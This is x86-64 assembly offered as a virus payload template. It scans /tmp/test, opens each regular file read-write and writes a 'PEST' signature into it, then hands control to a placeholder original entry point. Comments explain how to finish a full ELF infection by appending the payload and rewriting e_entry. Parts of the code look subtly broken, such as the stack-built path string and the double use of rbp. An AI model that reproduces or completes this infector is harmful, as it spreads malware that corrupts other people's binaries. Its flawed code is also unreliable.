.global _start

.text
_start:
    # 1. PRESERVE ENVIRONMENT (Standard payload entry)
    pushfq
    push r15 push r14 push r13 push r12 push r11 push r10 push r9 push r8
    push rdi push rsi push rbp push rdx push rcx push rbx push rax

    # 2. CALCULATE DELTA OFFSET
    call get_delta
get_delta:
    pop rbp
    sub rbp, offset get_delta

    # 3. SET UP STACK FRAME FOR LOCAL VARIABLES
    # We allocate 1024 bytes on the stack to hold directory entry buffers
    push rbp                # Save frame pointer
    mov rbp, rsp
    sub rsp, 1024           # Local buffer for sys_getdents64 at [rbp - 1024]

    # -------------------------------------------------------------------------
    # STEP A: OPEN THE TARGET DIRECTORY
    # -------------------------------------------------------------------------
    # Construct "/tmp/test\0" dynamically on the stack to ensure PIC
    xor rax, rax
    push rax                # Null terminator
    mov rax, 0x747365742f706d74 # "tmp/test" in little-endian hex
    push rax
    mov rax, 0x2f           # "/"
    push rax                # Complete string "/tmp/test\0" is now at RSP

    # Call sys_open (Syscall 2)
    mov rax, 2              # sys_open
    mov rdi, rsp            # Pointer to "/tmp/test" on the stack
    mov rsi, 0x10000        # O_RDONLY | O_DIRECTORY
    xor rdx, rdx            # Mode: 0
    syscall
    
    # Clean up the path string from stack
    add rsp, 24
    
    cmp rax, 0
    jl exit_payload         # If error opening directory, exit safely
    mov r12, rax            # r12 = Directory File Descriptor (Dir FD)

read_dir_loop:
    # -------------------------------------------------------------------------
    # STEP B: SCAN DIRECTORY CONTENTS
    # -------------------------------------------------------------------------
    # Call sys_getdents64 (Syscall 217)
    mov rax, 217            # sys_getdents64
    mov rdi, r12            # Dir FD
    lea rsi, [rbp - 1024]   # Pointer to stack buffer
    mov rdx, 1024           # Buffer size
    syscall

    cmp rax, 0
    jle close_dir           # If 0 (EOF) or negative (error), close directory
    mov r13, rax            # r13 = Total bytes read from getdents
    xor r14, r14            # r14 = Current byte position in buffer (bpos = 0)

process_entries:
    cmp r14, r13
    jge read_dir_loop       # If bpos >= total bytes read, get more entries

    # Calculate pointer to current linux_dirent64 structure
    lea r15, [rbp - 1024]
    add r15, r14            # r15 = Pointer to current entry

    # Extract d_reclen (offset 16, 2 bytes) to know how much to skip next
    movzx bx, word ptr [r15 + 16] 
    
    # Extract d_type (offset 18, 1 byte) to check if it's a regular file (DT_REG = 8)
    mov al, byte ptr [r15 + 18]
    cmp al, 8
    jne skip_entry          # Skip if it is a folder, symlink, etc.

    # Pointer to filename string (d_name starts at offset 19)
    lea rsi, [r15 + 19]     

    # Check for "." and ".." to avoid infinite traversal loops
    cmp byte ptr [rsi], 0x2E # Check if first char is '.'
    jne perform_infection
    cmp byte ptr [rsi + 1], 0x00 # Simple "."
    je skip_entry
    cmp byte ptr [rsi + 1], 0x2E # Check if second char is '.'
    jne perform_infection
    cmp byte ptr [rsi + 2], 0x00 # Simple ".."
    je skip_entry

perform_infection:
    # -------------------------------------------------------------------------
    # STEP C: OPEN INDIVIDUAL TARGET BINARY & WRITE
    # -------------------------------------------------------------------------
    # Construct the full path string (e.g., "/tmp/test/filename") on the stack
    # For a minimalist payload template, we invoke infection logic on the target file descriptor.
    
    # Call sys_open (Syscall 2) on the file found
    mov rax, 2              # sys_open
    mov rdi, rsi            # Pointer to d_name (relative paths work if working directory is adjusted)
    mov rsi, 2              # O_RDWR (Read/Write access)
    xor rdx, rdx
    syscall

    cmp rax, 0
    jl skip_entry           # If error opening the file, skip it
    mov rdi, rax            # rdi = Target File Descriptor (File FD)

    # --- CHOOSE YOUR INFECTION STRATEGY HERE ---
    # Example snippet: Write the virus signature string to test writing capability.
    # To fully infect, your code would parse ELF headers using sys_read,
    # append payload via sys_write, and change the e_entry offset.
    
    mov rax, 1              # sys_write
    # rdi already holds Target File Descriptor
    lea rsi, [rbp + virus_sig] # Relative pointer to virus signature
    mov rdx, 5              # Length of signature
    syscall

    # Call sys_close (Syscall 3) on Target File FD
    mov rax, 3              # sys_close
    # rdi already holds Target File Descriptor
    syscall

skip_entry:
    movzx bx, word ptr [r15 + 16] # Reload entry length
    add r14, rbx            # bpos += d_reclen
    jmp process_entries

close_dir:
    # Call sys_close (Syscall 3) on Directory FD
    mov rax, 3              # sys_close
    mov rdi, r12            # Dir FD
    syscall

exit_payload:
    # Restore stack frame
    mov rsp, rbp
    pop rbp

    # 4. RESTORE ENVIRONMENT (Standard payload exit)
    pop rax; pop rbx; pop rcx; pop rdx; pop rbp; pop rsi; pop rdi
    pop r8; pop r9; pop r10; pop r11; pop r12; pop r13; pop r14; pop r15
    popfq

    # 5. HAND OVER TO OEP
    mov rax, 0x1111111111111111 
    jmp rax

# -----------------------------------------------------------------------------
# CONSTANTS
# -----------------------------------------------------------------------------
virus_sig:
    .string "PEST\n"